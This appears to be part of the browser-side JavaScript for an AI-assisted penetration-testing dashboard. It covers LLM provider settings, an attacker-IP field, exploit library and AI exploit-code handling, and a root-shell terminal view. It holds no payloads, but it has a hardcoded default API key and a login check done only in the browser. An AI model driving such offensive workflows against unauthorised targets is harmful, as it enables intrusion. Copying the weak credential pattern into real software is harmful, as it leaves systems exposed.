console.log('app.js v2 loaded', window.location.href);
const API_BASE_URL = window.location.origin;
const DEFAULT_PENTOOL_API_KEY = 'pentool-api-key';

const LEGACY_API_KEY_STORAGE = `${'meta'}${'tron'}ApiKey`;
let pentoolApiKey = localStorage.getItem('pentoolApiKey') || localStorage.getItem(LEGACY_API_KEY_STORAGE) || DEFAULT_PENTOOL_API_KEY;
let apiToken = localStorage.getItem('apiToken') || null;

// Auth check - redirect to login if no token
const authToken = localStorage.getItem('authToken');
if (!authToken) {
    const loginPage = `${API_BASE_URL}/login`;
    // Only redirect if we're not already on the login page
    if (!window.location.pathname.includes('/login')) {
        window.location.href = loginPage;
    }
} else {
    // Use auth token for API calls
    apiToken = authToken;
    localStorage.setItem('apiToken', authToken);
}

// Set username from auth
try {
    const authUser = JSON.parse(localStorage.getItem('authUser') || '{}');
    if (authUser.username) {
        document.getElementById('username').textContent = authUser.username;
    }
} catch(e) {};
let threatChart = null;
let latestVulnsCache = [];
let latestExploitsCache = [];
let exploitLibraryCache = [];
let selectedExploitArtifact = null;
let pendingAiExploitCode = '';
let latestScansCache = [];
let activeScanId = localStorage.getItem('activeScanId') || null;
let activeScanPollTimer = null;
let currentScanData = null;
let lastTerminalCommand = '';
let llmProviderCatalog = [
    { id: 'openai_compatible', label: 'OpenAI compatible', category: 'custom', protocol: 'openai', api_base: 'http://localhost:1234/v1', requires_api_key: false, description: 'Cualquier endpoint Chat Completions.', accent: 'custom' },
    { id: 'openai', label: 'OpenAI', category: 'cloud', protocol: 'openai', api_base: 'https://api.openai.com/v1', requires_api_key: true, description: 'API oficial de OpenAI.', accent: 'openai' },
    { id: 'ollama', label: 'Ollama', category: 'local', protocol: 'ollama', api_base: 'http://localhost:11434', requires_api_key: false, description: 'Runtime local de Ollama.', accent: 'ollama' },
    { id: 'lm_studio', label: 'LM Studio', category: 'local', protocol: 'openai', api_base: 'http://localhost:1234/v1', requires_api_key: false, description: 'Servidor local de LM Studio.', accent: 'local' },
    { id: 'vllm', label: 'vLLM / SGLang', category: 'local', protocol: 'openai', api_base: 'http://localhost:8000/v1', requires_api_key: false, description: 'Servidor de inferencia local.', accent: 'local' },
    { id: 'nvidia_nim', label: 'NVIDIA NIM', category: 'cloud', protocol: 'openai', api_base: 'https://integrate.api.nvidia.com/v1', requires_api_key: true, description: 'Catálogo cloud de NVIDIA.', accent: 'nvidia' },
    { id: 'nvidia_nim_local', label: 'NVIDIA NIM local', category: 'local', protocol: 'openai', api_base: 'http://localhost:8001/v1', requires_api_key: false, description: 'Contenedor NIM propio.', accent: 'nvidia' },
    { id: 'deepseek', label: 'DeepSeek', category: 'cloud', protocol: 'openai', api_base: 'https://api.deepseek.com', requires_api_key: true, description: 'Modelos DeepSeek.', accent: 'deepseek' },
    { id: 'groq', label: 'Groq', category: 'cloud', protocol: 'openai', api_base: 'https://api.groq.com/openai/v1', requires_api_key: true, description: 'Inferencia de baja latencia.', accent: 'groq' },
    { id: 'mistral', label: 'Mistral AI', category: 'cloud', protocol: 'openai', api_base: 'https://api.mistral.ai/v1', requires_api_key: true, description: 'API de modelos Mistral.', accent: 'mistral' },
    { id: 'together', label: 'Together AI', category: 'cloud', protocol: 'openai', api_base: 'https://api.together.ai/v1', requires_api_key: true, description: 'Modelos abiertos mediante API.', accent: 'together' },
    { id: 'openrouter', label: 'OpenRouter', category: 'gateway', protocol: 'openai', api_base: 'https://openrouter.ai/api/v1', requires_api_key: true, description: 'Gateway unificado de modelos.', accent: 'openrouter' },
];
let loadedLlmConfig = null;
let lastLlmProbe = null;
let systemHealthCache = null;

const SECTION_TITLES = {
    dashboard: 'Resumen de seguridad',
    scan: 'Nuevo escaneo',
    'scan-detail': 'Sesión activa',
    history: 'Historial',
    reports: 'Reportes',
    exploits: 'Exploit Manager',
    settings: 'Configuración de IA',
    cve: 'CVE Intelligence',
    explorer: 'Explorador de Víctima',
    tools: 'Herramientas Ofensivas',
    chat: 'Chat con IA',
    admin: 'Gestión de Usuarios',
    system: 'Diagnóstico del sistema',
};

function normalizeSeverityLabel(value) {
    const text = String(value || '').toLowerCase();
    if (text.includes('critical')) return 'critical';
    if (text.includes('high')) return 'high';
    if (text.includes('medium')) return 'medium';
    if (text.includes('low')) return 'low';
    if (text.includes('crit')) return 'critical';
    return 'unknown';
}

function escapeHtml(value) {
    return String(value ?? '').replace(/[&<>"']/g, (char) => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;',
    }[char]));
}

function cleanDisplayText(value) {
    return String(value ?? '')
        .replace(/```[a-zA-Z0-9_-]*\n?/g, '')
        .replace(/```/g, '')
        .replace(/^\s{0,3}#{1,6}\s+/gm, '')
        .replace(/\*\*(.*?)\*\*/g, '$1')
        .replace(/\*(.*?)\*/g, '$1')
        .replace(/`([^`]+)`/g, '$1')
        .trim();
}

function extractCodeFromResponse(response) {
    const codeBlockRegex = /```(?:bash|sh|python|perl|ruby|php)?\n?([\s\S]*?)```/g;
    let match;
    let extractedCode = '';
    while ((match = codeBlockRegex.exec(response)) !== null) {
        extractedCode += match[1] + '\n';
    }
    return extractedCode.trim() || response;
}

function vulnTargetLabel(vuln) {
    return vuln.target || vuln.ip || vuln.host || (vuln.scan_id ? `scan ${vuln.scan_id}` : 'Objetivo no asociado');
}

function formatDate(value) {
    if (!value) return '-';
    const date = new Date(value);
    if (Number.isNaN(date.getTime())) return String(value);
    return date.toLocaleString('es-ES');
}

function severityRank(value) {
    const severity = normalizeSeverityLabel(value);
    return { low: 0, medium: 1, high: 2, critical: 3, unknown: 4 }[severity] ?? 4;
}

function showToast(message, type = 'info', duration = 3000) {
    const toastContainer = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    const icon = document.createElement('i');
    icon.className = `fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}`;
    const text = document.createElement('span');
    text.textContent = message;
    toast.append(icon, text);
    toastContainer.appendChild(toast);
    setTimeout(() => toast.remove(), duration);
}

function logActivity(text) {
    const activityLog = document.getElementById('activity-log');
    const now = new Date().toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' });
    const item = document.createElement('div');
    item.className = 'activity-item';
    const time = document.createElement('span');
    time.className = 'activity-time';
    time.textContent = now;
    const label = document.createElement('span');
    label.className = 'activity-text';
    label.textContent = text;
    item.append(time, label);
    activityLog.insertBefore(item, activityLog.firstChild);
    while (activityLog.children.length > 10) {
        activityLog.removeChild(activityLog.lastChild);
    }
}

function setStatusBadge(elementId, isOnline, onlineText = 'EN LINEA', offlineText = 'OFFLINE') {
    const el = document.getElementById(elementId);
    if (!el) return;
    el.textContent = isOnline ? onlineText : offlineText;
    el.className = `status-badge ${isOnline ? 'online' : 'offline'}`;
}

function savePenToolApiKey(value) {
    pentoolApiKey = value || DEFAULT_PENTOOL_API_KEY;
    localStorage.setItem('pentoolApiKey', pentoolApiKey);
    localStorage.removeItem(LEGACY_API_KEY_STORAGE);
    const input = document.getElementById('api-key-input');
    if (input) input.value = pentoolApiKey;
}

function getAuthHeaders(includeJson = false) {
    const headers = {};
    if (includeJson) headers['Content-Type'] = 'application/json';
    if (pentoolApiKey) headers['X-API-KEY'] = pentoolApiKey;
    if (apiToken) headers['Authorization'] = `Bearer ${apiToken}`;
    return headers;
}

async function authenticate() {
    savePenToolApiKey(document.getElementById('api-key-input')?.value?.trim() || pentoolApiKey);
    try {
        const controller = new AbortController();
        const authTimer = setTimeout(() => controller.abort(), 8000);
        const response = await fetch(`${API_BASE_URL}/token`, {
            method: 'POST',
            signal: controller.signal,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ api_key: pentoolApiKey }),
        });
        clearTimeout(authTimer);

        if (!response.ok) {
            setStatusBadge('api-status', false);
            showToast('API key invalida para PenTool', 'error');
            return false;
        }

        const data = await response.json();
        apiToken = data.access_token;
        localStorage.setItem('apiToken', apiToken);
        setStatusBadge('api-status', true);
        setStatusBadge('db-status', true);
        logActivity('Autenticacion exitosa');
        return true;
    } catch (error) {
        setStatusBadge('api-status', false);
        setStatusBadge('db-status', false);
        showToast('No se pudo conectar al servidor', 'error');
        return false;
    }
}

async function apiFetch(path, options = {}) {
    const timeoutMs = options.timeout ?? 15000;
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), timeoutMs);
    try {
        const { timeout: _t, ...fetchOpts } = options;
        const response = await fetch(`${API_BASE_URL}${path}`, {
            ...fetchOpts,
            signal: controller.signal,
            headers: {
                ...getAuthHeaders(fetchOpts.body !== undefined),
                ...(fetchOpts.headers || {}),
            },
        });

        if (!response.ok) {
            const text = await response.text();
            const error = new Error(text || `HTTP ${response.status}`);
            error.status = response.status;
            throw error;
        }

        return response.json();
    } finally {
        clearTimeout(timeout);
    }
}

function normalizeScan(scan) {
    if (Array.isArray(scan)) {
        return { sl_no: scan[0], target: scan[1], timestamp: scan[2], status: scan[3], scan_id: scan[4] };
    }
    return scan;
}

function normalizeStatusLabel(status) {
    const value = String(status || 'completed').toLowerCase();
    if (['running', 'queued', 'paused', 'failed', 'completed'].includes(value)) return value;
    return 'completed';
}

function normalizeVuln(vuln) {
    if (Array.isArray(vuln)) {
        return {
            id: vuln[0],
            sl_no: vuln[1],
            target: vuln[8] || '',
            scan_id: vuln[9] || '',
            vuln_name: vuln[2],
            severity: vuln[3],
            port: vuln[4],
            service: vuln[5],
            description: vuln[6],
            fix: vuln[7] || '',
        };
    }
    return vuln;
}

function setElementText(id, value) {
    const element = document.getElementById(id);
    if (element) element.textContent = value;
}

function updateLlmConfigStatus(message, ok = null, detail = '') {
    const status = document.getElementById('llm-config-status');
    const pill = document.getElementById('llm-connection-pill');
    if (status) {
        status.className = `diagnostic-card${ok === null ? '' : ok ? ' online' : ' offline'}`;
        const title = status.querySelector('strong');
        const description = status.querySelector('p');
        if (title) title.textContent = message;
        if (description) description.textContent = detail || (ok ? 'El proveedor está listo para analizar.' : 'Revisa el endpoint, la clave y el modelo.');
    }
    if (pill) {
        pill.className = `connection-pill${ok === null ? '' : ok ? ' online' : ' offline'}`;
        pill.innerHTML = `<i></i> ${escapeHtml(ok === null ? 'Sin verificar' : ok ? 'Operativo' : 'Con error')}`;
    }
    if (ok !== null) setStatusBadge('llm-status', ok);
}

function parseJsonObjectField(id, label) {
    const raw = document.getElementById(id)?.value?.trim();
    if (!raw) return {};
    const value = JSON.parse(raw);
    if (!value || Array.isArray(value) || typeof value !== 'object') {
        throw new Error(`${label} debe ser un objeto JSON`);
    }
    return value;
}

function collectLlmSettingsFromForm() {
    return {
        provider: document.getElementById('llm-provider').value,
        api_base: document.getElementById('llm-api-base').value.trim(),
        api_key: document.getElementById('llm-api-key').value,
        model: document.getElementById('llm-model-input').value.trim(),
        attacker_ip: document.getElementById('attacker-ip-input').value.trim(),
        temperature: Number(document.getElementById('llm-temperature').value || 0.7),
        top_p: Number(document.getElementById('llm-top-p').value || 0.9),
        max_tokens: Number(document.getElementById('llm-max-tokens').value || 8192),
        timeout: Number(document.getElementById('llm-timeout').value || 120),
        api_key_header: document.getElementById('llm-api-key-header').value.trim() || 'Authorization',
        api_key_prefix: document.getElementById('llm-api-key-prefix').value.trim(),
        chat_path: document.getElementById('llm-chat-path').value.trim() || '/chat/completions',
        models_path: document.getElementById('llm-models-path').value.trim() || '/models',
        extra_headers: parseJsonObjectField('llm-extra-headers', 'Headers extra'),
        extra_body: parseJsonObjectField('llm-extra-body', 'Body extra'),
        clear_api_key: document.getElementById('llm-clear-api-key').checked,
        clear_extra_headers: document.getElementById('llm-clear-extra-headers').checked,
    };
}

function providerIcon(provider) {
    if (provider.id.startsWith('nvidia')) return 'fa-bolt';
    if (provider.id === 'ollama') return 'fa-cube';
    if (provider.category === 'local') return 'fa-server';
    if (provider.category === 'gateway') return 'fa-route';
    if (provider.category === 'custom') return 'fa-code-branch';
    return 'fa-cloud';
}

function selectedProviderMeta(providerId = null) {
    const id = providerId || document.getElementById('llm-provider')?.value;
    return llmProviderCatalog.find((provider) => provider.id === id) || null;
}

function renderProviderCatalog(selectedId) {
    const select = document.getElementById('llm-provider');
    const container = document.getElementById('provider-presets');
    if (!select || !container || !llmProviderCatalog.length) return;

    select.innerHTML = '';
    container.innerHTML = '';
    llmProviderCatalog.forEach((provider) => {
        const option = document.createElement('option');
        option.value = provider.id;
        option.textContent = provider.label;
        option.selected = provider.id === selectedId;
        select.appendChild(option);

        const button = document.createElement('button');
        button.type = 'button';
        button.className = `provider-card ${provider.accent || ''}${provider.id === selectedId ? ' active' : ''}`;
        button.dataset.provider = provider.id;
        button.innerHTML = `
            <i class="fas ${providerIcon(provider)} provider-card-icon"></i>
            <strong>${escapeHtml(provider.label)}</strong>
            <small>${escapeHtml(provider.category)}</small>
        `;
        button.addEventListener('click', () => applyProviderSelection(provider.id, true));
        container.appendChild(button);
    });
}

function updateProviderSummary(config) {
    const provider = selectedProviderMeta(config.provider) || config.provider_meta;
    const label = provider?.label || config.provider || 'OpenAI compatible';
    setElementText('settings-provider-name', label);
    setElementText('settings-provider-description', provider?.description || 'Endpoint de inferencia configurable.');
    setElementText('settings-provider-protocol', provider?.protocol === 'ollama' ? 'Ollama API' : 'OpenAI API');
    setElementText('settings-key-state', config.api_key_configured ? 'Configurada' : provider?.requires_api_key ? 'Requerida' : 'Opcional');
    setElementText('active-provider-name', label);
    setElementText('active-model-name', config.model || 'Sin seleccionar');

    const orb = document.getElementById('provider-orb');
    if (orb) orb.className = `provider-orb ${provider?.accent || ''}`;
    const keyHint = document.getElementById('llm-key-hint');
    if (keyHint) {
        keyHint.textContent = config.api_key_configured
            ? 'Hay una clave guardada. Déjala vacía para conservarla.'
            : provider?.requires_api_key
                ? 'Este proveedor requiere una API key.'
                : 'Este proveedor puede funcionar sin credenciales.';
    }
}

function applyProviderSelection(providerId, applyDefaults = false) {
    const provider = selectedProviderMeta(providerId);
    if (!provider) return;
    document.getElementById('llm-provider').value = provider.id;
    document.querySelectorAll('.provider-card').forEach((card) => {
        card.classList.toggle('active', card.dataset.provider === provider.id);
    });
    if (applyDefaults) {
        document.getElementById('llm-api-base').value = provider.api_base || '';
        document.getElementById('llm-api-key').value = '';
        document.getElementById('llm-model-input').value = '';
        document.getElementById('llm-clear-api-key').checked = false;
        populateModelSelect([], '');
        loadedLlmConfig = { ...(loadedLlmConfig || {}), provider: provider.id, api_base: provider.api_base, api_key_configured: false, model: '' };
        updateLlmConfigStatus('Nuevo proveedor seleccionado', null, 'Configura la credencial y descubre sus modelos.');
    }
    updateProviderSummary({
        ...(loadedLlmConfig || {}),
        provider: provider.id,
        provider_meta: provider,
        api_key_configured: applyDefaults ? false : Boolean(loadedLlmConfig?.api_key_configured),
        model: document.getElementById('llm-model-input').value.trim(),
    });
}

function syncTuningOutputs() {
    setElementText('temperature-value', document.getElementById('llm-temperature')?.value || '0.7');
    setElementText('top-p-value', document.getElementById('llm-top-p')?.value || '0.9');
}

function populateLlmSettings(config) {
    loadedLlmConfig = config;
    renderProviderCatalog(config.provider || 'openai_compatible');
    document.getElementById('llm-provider').value = config.provider || 'openai_compatible';
    document.getElementById('llm-api-base').value = config.api_base || '';
    document.getElementById('llm-api-key').value = '';
    document.getElementById('llm-clear-api-key').checked = false;
    document.getElementById('llm-clear-extra-headers').checked = false;
    document.getElementById('llm-model-input').value = config.model || '';
    document.getElementById('attacker-ip-input').value = config.attacker_ip || '';
    document.getElementById('llm-temperature').value = config.temperature ?? 0.7;
    document.getElementById('llm-top-p').value = config.top_p ?? 0.9;
    document.getElementById('llm-max-tokens').value = config.max_tokens ?? 8192;
    document.getElementById('llm-timeout').value = config.timeout ?? 120;
    document.getElementById('llm-api-key-header').value = config.api_key_header || 'Authorization';
    document.getElementById('llm-api-key-prefix').value = config.api_key_prefix ?? 'Bearer';
    document.getElementById('llm-chat-path').value = config.chat_path || '/chat/completions';
    document.getElementById('llm-models-path').value = config.models_path || '/models';
    document.getElementById('llm-extra-headers').value = '';
    document.getElementById('llm-extra-body').value = Object.keys(config.extra_body || {}).length ? JSON.stringify(config.extra_body, null, 2) : '';
    populateModelSelect(config.model ? [config.model] : [], config.model);
    updateProviderSummary(config);
    syncTuningOutputs();
}

function populateModelSelect(models, selectedModel) {
    const select = document.getElementById('llm-model-select');
    select.innerHTML = '<option value="">Selecciona un modelo</option>';
    models.forEach((model) => {
        const option = document.createElement('option');
        option.value = model;
        option.textContent = model;
        if (model === selectedModel) option.selected = true;
        select.appendChild(option);
    });
}

async function loadLlmSettings() {
    try {
        const [catalog, config] = await Promise.all([
            apiFetch('/settings/llm/providers'),
            apiFetch('/settings/llm'),
        ]);
        if (catalog?.providers?.length) {
            llmProviderCatalog = catalog.providers;
        }
        populateLlmSettings(config);
        updateLlmConfigStatus('Configuración cargada', null, 'Prueba la inferencia para confirmar el estado actual.');
        setStatusBadge('llm-status', Boolean(config.model), config.model ? 'CONFIGURADO' : 'PENDIENTE', 'PENDIENTE');
    } catch (error) {
        renderProviderCatalog('openai_compatible');
        updateLlmConfigStatus('Error: ' + (error.message || 'No se pudo cargar la configuración'), false);
    }
}

function getFallbackProviders() {
    return [
        { id: 'openai_compatible', label: 'OpenAI compatible', category: 'custom', protocol: 'openai', api_base: 'http://localhost:1234/v1', requires_api_key: false, description: 'Cualquier endpoint Chat Completions.', accent: 'custom' },
        { id: 'openai', label: 'OpenAI', category: 'cloud', protocol: 'openai', api_base: 'https://api.openai.com/v1', requires_api_key: true, description: 'API oficial de OpenAI.', accent: 'openai' },
        { id: 'ollama', label: 'Ollama', category: 'local', protocol: 'ollama', api_base: 'http://localhost:11434', requires_api_key: false, description: 'Runtime local de Ollama.', accent: 'ollama' },
        { id: 'lm_studio', label: 'LM Studio', category: 'local', protocol: 'openai', api_base: 'http://localhost:1234/v1', requires_api_key: false, description: 'Servidor local de LM Studio.', accent: 'local' },
        { id: 'vllm', label: 'vLLM / SGLang', category: 'local', protocol: 'openai', api_base: 'http://localhost:8000/v1', requires_api_key: false, description: 'Servidor de inferencia local.', accent: 'local' },
        { id: 'nvidia_nim', label: 'NVIDIA NIM', category: 'cloud', protocol: 'openai', api_base: 'https://integrate.api.nvidia.com/v1', requires_api_key: true, description: 'Catálogo cloud de NVIDIA.', accent: 'nvidia' },
    ];
}

async function refreshAvailableModels(selectedModel = null) {
    let payload;
    try {
        payload = collectLlmSettingsFromForm();
        updateLlmConfigStatus('Consultando catálogo…', null, 'Esperando respuesta del proveedor.');
        const data = await apiFetch('/settings/llm/models', {
            method: 'POST',
            body: JSON.stringify(payload),
        });
        const chosen = selectedModel || document.getElementById('llm-model-input').value.trim() || data.config.model;
        populateModelSelect(data.models || [], chosen);
        if (chosen) document.getElementById('llm-model-input').value = chosen;
        updateLlmConfigStatus(`${data.models.length} modelos detectados`, null, 'Selecciona uno o conserva el nombre manual.');
        showToast(`Se detectaron ${data.models.length} modelos`, 'success');
    } catch (error) {
        populateModelSelect([], '');
        updateLlmConfigStatus('No fue posible listar modelos', false, 'Puedes indicar el modelo manualmente y probar la inferencia.');
        showToast(error instanceof SyntaxError ? 'Revisa el JSON de compatibilidad avanzada' : 'El proveedor no devolvió un catálogo de modelos', 'error');
    }
}

async function saveLlmSettings() {
    let payload;
    try {
        payload = collectLlmSettingsFromForm();
    } catch (error) {
        showToast(error.message || 'Configuración avanzada inválida', 'error');
        return false;
    }
    if (!payload.model) {
        showToast('Debes seleccionar o escribir un modelo', 'error');
        return false;
    }
    try {
        const saved = await apiFetch('/settings/llm', { method: 'PUT', body: JSON.stringify(payload) });
        populateLlmSettings(saved);
        updateLlmConfigStatus('Configuración guardada', null, 'Prueba la inferencia para validar los cambios.');
        showToast('Configuración LLM guardada', 'success');
        return true;
    } catch (error) {
        updateLlmConfigStatus('Error al guardar la configuración', false);
        showToast('No se pudo guardar la configuración del LLM', 'error');
        return false;
    }
}

async function testLlmConnection() {
    const button = document.getElementById('test-llm-btn');
    try {
        const payload = collectLlmSettingsFromForm();
        if (!payload.model) {
            showToast('Indica un modelo antes de probar la inferencia', 'error');
            return;
        }
        if (button) {
            button.disabled = true;
            button.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Probando…';
        }
        updateLlmConfigStatus('Ejecutando inferencia…', null, 'Se enviará una respuesta mínima al modelo seleccionado.');
        const result = await apiFetch('/settings/llm/test', {
            method: 'POST',
            body: JSON.stringify(payload),
        });
        lastLlmProbe = result;
        updateLlmConfigStatus(
            `${result.provider_label} respondió en ${result.latency_ms} ms`,
            true,
            `${result.model} · inferencia real confirmada${result.models_error ? ' · catálogo no disponible' : ''}.`,
        );
        setElementText('active-provider-name', result.provider_label);
        setElementText('active-model-name', result.model);
        setElementText('active-provider-latency', `${result.latency_ms} ms`);
        setElementText('active-provider-health', 'Operativo');
        document.querySelector('.intel-health')?.classList.add('online');
        setStatusBadge('llm-status', true);
        showToast('Inferencia LLM verificada', 'success');
    } catch (error) {
        updateLlmConfigStatus('Falló la inferencia del LLM', false);
        setElementText('active-provider-health', 'Con error');
        document.querySelector('.intel-health')?.classList.remove('online');
        setStatusBadge('llm-status', false);
        const detail = error.message ? error.message.replace(/^"|"$/g, '') : '';
        showToast(detail || 'La conexión con el LLM falló', 'error');
        console.error('LLM test error:', detail);
    } finally {
        if (button) {
            button.disabled = false;
            button.innerHTML = '<i class="fas fa-bolt"></i> Probar inferencia';
        }
    }
}

function renderSystemHealth(health) {
    systemHealthCache = health;
    const networkUrls = health.network?.lan_urls || [];
    const primaryUrl = networkUrls.find((url) => url.includes('192.168.100.')) || networkUrls[0] || `${window.location.protocol}//${window.location.host}`;
    setElementText('lan-url-label', primaryUrl.replace(/^https?:\/\//, ''));
    setElementText('system-lan-primary', primaryUrl);
    setElementText('system-server-state', health.status === 'healthy' ? 'Operativo' : 'Degradado');
    setElementText('system-platform', health.tools?.platform || 'Plataforma desconocida');
    setElementText('system-db-state', health.database?.status === 'online' ? 'En línea' : 'No disponible');
    setElementText('system-llm-state', health.llm?.configured ? 'Configurado' : 'Pendiente');
    setElementText('system-llm-model', health.llm?.model || health.llm?.provider || 'Sin modelo');
    setElementText('system-tools-count', `${health.tools?.operational || 0} / ${health.tools?.total || 0}`);

    const urlsContainer = document.getElementById('system-lan-urls');
    if (urlsContainer) {
        urlsContainer.innerHTML = networkUrls.length
            ? networkUrls.map((url) => `<code>${escapeHtml(url)}</code>`).join('')
            : '<span class="field-hint">No se detectaron interfaces de red disponibles.</span>';
    }

    const toolsGrid = document.getElementById('system-tools-grid');
    if (toolsGrid) {
        toolsGrid.innerHTML = '';
        (health.tools?.tools || []).forEach((tool) => {
            const card = document.createElement('article');
            card.className = `tool-status-card ${tool.mode}`;
            const statusLabel = tool.mode === 'external' ? 'Instalada' : tool.mode === 'fallback' ? 'Alternativa activa' : 'No instalada';
            card.innerHTML = `
                <span class="tool-status-dot"></span>
                <div>
                    <strong>${escapeHtml(tool.label)}</strong>
                    <small>${escapeHtml(tool.category)}</small>
                </div>
                <span class="tool-mode">${escapeHtml(statusLabel)}</span>
                ${tool.fallback && tool.mode === 'fallback' ? `<p>${escapeHtml(tool.fallback)}</p>` : ''}
            `;
            toolsGrid.appendChild(card);
        });
    }
}

async function loadSystemHealth(showFeedback = false) {
    const refreshButton = document.getElementById('refresh-system-health');
    try {
        if (refreshButton) {
            refreshButton.disabled = true;
            refreshButton.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Comprobando…';
        }
        const health = await apiFetch('/system/health');
        renderSystemHealth(health);
        if (showFeedback) showToast('Diagnóstico actualizado', 'success');
    } catch (error) {
        setElementText('system-server-state', 'No disponible');
        if (showFeedback) showToast('No se pudo actualizar el diagnóstico', 'error');
    } finally {
        if (refreshButton) {
            refreshButton.disabled = false;
            refreshButton.innerHTML = '<i class="fas fa-rotate"></i> Actualizar diagnóstico';
        }
    }
}

async function copyLanUrl() {
    const url = systemHealthCache?.network?.lan_urls?.find((item) => item.includes('192.168.100.'))
        || systemHealthCache?.network?.lan_urls?.[0];
    if (!url) {
        showToast('No hay una dirección LAN disponible', 'warning');
        return;
    }
    try {
        await navigator.clipboard.writeText(url);
        showToast('Dirección de red copiada', 'success');
    } catch (error) {
        showToast(url, 'info', 5000);
    }
}

function showSection(sectionName) {
    document.querySelectorAll('.nav-link').forEach((link) => {
        link.classList.toggle('active', link.getAttribute('data-section') === sectionName);
    });
    document.querySelectorAll('.content-section').forEach((section) => section.classList.remove('active'));
    const target = document.getElementById(`${sectionName}-section`);
    if (target) target.classList.add('active');
    setElementText('workspace-title', SECTION_TITLES[sectionName] || 'PenTool');
    window.scrollTo(0, 0);
    if (sectionName === 'exploits') {
        loadExploitLibrary();
        updateExploitContext();
    }
    if (sectionName === 'explorer') {
        connectExplorerFromActiveScan();
    }
    if (sectionName === 'settings' && !llmProviderCatalog.length) {
        loadLlmSettings();
    }
    if (sectionName === 'system') {
        loadSystemHealth();
    }
}

function connectExplorerFromActiveScan() {
    const connStatus = document.getElementById('explorer-conn-status');
    if (!connStatus) return;
    if (activeScanId && currentScanData) {
        connStatus.className = 'explorer-conn-status connected';
        const icon = connStatus.querySelector('i');
        if (icon) icon.className = 'fas fa-plug';
        const text = connStatus.querySelector('span');
        if (text) text.textContent = 'Conectado a ' + activeScanId;
        explorerConnect(activeScanId);
        explorerUpdateSessionInfo(currentScanData);
        document.getElementById('explorer-refresh-btn').style.display = 'inline-flex';
    } else {
        connStatus.className = 'explorer-conn-status disconnected';
        const icon = connStatus.querySelector('i');
        if (icon) icon.className = 'fas fa-plug';
        const text = connStatus.querySelector('span');
        if (text) text.textContent = 'No hay sesión activa. Realiza un escaneo primero.';
        explorerDisconnect();
        document.getElementById('explorer-refresh-btn').style.display = 'none';
    }
}

function updateExploitContext() {
    const ctx = document.getElementById('exploits-context');
    const info = document.getElementById('exploits-session-info');
    const label = document.getElementById('exploits-session-label');
    if (!ctx) return;
    if (activeScanId && currentScanData) {
        const access = currentScanData.access_type || 'unknown';
        const hasRoot = currentScanData.has_root ? '✅ Root' : '⏳ No root';
        ctx.innerHTML = `<strong>Objetivo:</strong> ${currentScanData.target || '—'} &nbsp;|&nbsp; <strong>Sesión:</strong> ${activeScanId} &nbsp;|&nbsp; <strong>Acceso:</strong> ${access} ${hasRoot}`;
        ctx.style.color = 'var(--text)';
        if (info) info.style.display = 'block';
        if (label) label.textContent = `${currentScanData.target || ''}  ·  ${access}`;
        // Pre-fill exploit target field
        const targetInput = document.getElementById('exploit-target');
        if (targetInput && currentScanData.target && !targetInput.value) {
            targetInput.value = currentScanData.target;
        }
    } else {
        ctx.innerHTML = 'Sin sesión activa. Los exploits se mostrarán aquí según el objetivo.';
        ctx.style.color = 'var(--muted)';
        if (info) info.style.display = 'none';
    }
}

function renderLogList(containerId, items, formatter) {
    const container = document.getElementById(containerId);
    if (!container) return;
    container.innerHTML = '';
    if (!items || items.length === 0) {
        container.innerHTML = `<div class="empty-state"><i class="fas fa-inbox"></i><p>Sin datos todavia</p></div>`;
        return;
    }
    const fragment = document.createDocumentFragment();
    items.forEach((item) => fragment.appendChild(formatter(item)));
    container.appendChild(fragment);
}

function makeLogEntry(title, phase, timestamp, content) {
    const wrapper = document.createElement('div');
    wrapper.className = 'log-entry';
    const header = document.createElement('div');
    header.className = 'log-entry-header';
    const titleEl = document.createElement('span');
    titleEl.className = 'log-entry-title';
    titleEl.textContent = title || 'Evento';
    const metaEl = document.createElement('span');
    metaEl.className = 'log-entry-phase';
    metaEl.textContent = `${phase || 'evento'}${timestamp ? ` - ${formatDate(timestamp)}` : ''}`;
    const pre = document.createElement('pre');
    pre.textContent = content || '';
    header.append(titleEl, metaEl);
    wrapper.append(header, pre);
    return wrapper;
}

function setTextIfPresent(elementId, text) {
    const element = document.getElementById(elementId);
    if (element) element.textContent = text;
}

function setTextContent(selector, text) {
    const element = selector.startsWith('#') ? document.getElementById(selector.slice(1)) : document.querySelector(selector);
    if (element) element.textContent = text;
}

function appendTerminalOutput(command, output) {
    const terminalOutput = document.getElementById('terminal-output');
    if (!terminalOutput) return;
    const previous = terminalOutput.textContent || '';
    const placeholders = [
        'Sin salida todavia.',
        'Sin salida todavía.',
        'Acceso root por bindshell 1524. Puedes ejecutar comandos.',
        'Acceso root obtenido. Puedes ejecutar comandos.',
        'Ingresa un comando y presiona Ejecutar para ver la salida.',
        'Ingresa un comando y presiona Ejecutar comando para ver la salida.',
    ];
    const base = placeholders.some((text) => previous.startsWith(text)) ? '' : previous.trimEnd();
    terminalOutput.textContent = `${base}${base ? '\n\n' : ''}pentool# ${command}\n${output || 'Sin salida.'}`.trimEnd();
    terminalOutput.dataset.lastCommand = command;
    terminalOutput.dataset.lastOutput = output || '';
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

function setActiveScan(scanId) {
    activeScanId = scanId;
    const scanDetailNav = document.getElementById('scan-detail-nav');
    if (scanId) {
        localStorage.setItem('activeScanId', scanId);
        if (scanDetailNav) scanDetailNav.style.display = 'flex';
    } else {
        localStorage.removeItem('activeScanId');
        currentScanData = null;
        if (scanDetailNav) scanDetailNav.style.display = 'none';
    }
}

async function generateReport(slNo, format, button = null) {
    try {
        if (button) {
            button.disabled = true;
            button.dataset.originalHtml = button.innerHTML;
            button.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Generando…';
        }
        const includeExploitation = document.getElementById(`report-include-exploitation-${slNo}`)?.checked ?? true;
        const includeCommands = document.getElementById(`report-include-commands-${slNo}`)?.checked ?? true;
        const result = await apiFetch('/report', {
            method: 'POST',
            body: JSON.stringify({
                sl_no: slNo,
                format,
                include_exploitation: includeExploitation,
                include_commands: includeCommands,
            }),
        });
